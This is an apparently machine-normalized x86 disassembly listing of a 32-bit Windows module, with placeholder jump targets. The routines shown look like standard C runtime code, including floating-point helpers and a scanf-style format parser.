cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1002b900
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1002b960
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_100624a0
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x14
sub_1002b9a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_1003d430
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ esp + 0x10 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_10078600
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_1002ba80
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fd42
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100480a0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xffffffff
xor eax eax
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100480a0
push 0xffffffff
xor esi esi
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] si
push eax
jmp r-xdata
call sub_1001c310
sub_1002bb60
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
sub eax edx
mov edx [ ecx + 0x8 ]
inc eax
push eax
mov eax [ ecx ]
push edx
call eax
mov esi eax
add esp 0x8
mov ecx edi
sub esi edi
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_1002bb9f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100279e4
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003a308
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042722
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100128a4
jmp r-xdata
sub_1002bc30
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edx [ ebp - 0x58 ]
mov edi ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x1c ]
push edx
mov [ ebp - 0x58 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xa9
call sub_1000a6f0
mov esi [ ebp - 0x58 ]
call sub_10009820
mov esi eax
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x5c ]
mov esi [ ecx ]
test esi esi
je r-xdata
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea esp [ esp ]
mov edi [ esi ]
lea edx [ ebp - 0x54 ]
push edx
mov ecx ebx
call sub_10053ba0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1002bd03
push 0x28
mov eax sub_1007e5a2
call sub_10050d0f
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
sub_1002bd98
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a0 ] eax
mov [ ebp - 0x1b0 ] esi
mov [ ebp - 0x1a8 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1f4 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x204 ]
call sub_10054678
mov al [ esi ]
mov [ ebp - 0x1a2 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1c8 ] edi
test al al
je r-xdata
push eax
call sub_1001742d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_1004ba5c
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1fc ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1b0 ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a0 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_1007a6f9
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1b0 ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
mov esi [ ebp - 0x1b0 ]
push [ ebp - 0x1a0 ]
push eax
call sub_100209ad
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_10035cd0
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x19c ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x1a3 ] 0x0
mov [ ebp - 0x1a4 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x1a1 ] 0x0
mov [ ebp - 0x195 ] 0x0
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1dc ] edi
inc esi
movzx eax [ esi ]
push eax
call sub_1004ba5c
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_100209ad
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1b0 ] esi
cmp ecx eax
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a8 ]
call sub_10020a90
pop ecx
cmp [ esi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc esi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1f4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_100209ad
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_10003602
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b0 ] esi
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
cmp [ ebp - 0x1a2 ] al
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e4 ]
mov ebx [ eax ]
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1fc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1dc ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e8 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1b0 ]
mov edi [ ebp - 0x1e8 ]
push [ ebp - 0x1a0 ]
lea esi [ ebp - 0x18c ]
call sub_1007a6f9
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1ec ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov esi ebx
je r-xdata
mov [ ebp - 0x1a1 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_10012991
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ebx eax
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_100209ad
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
dec [ ebp - 0x1a2 ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x1c4 ]
movzx eax bl
push eax
call sub_1004dbb5
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_1004dbb5
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov edx [ ebp - 0x1a0 ]
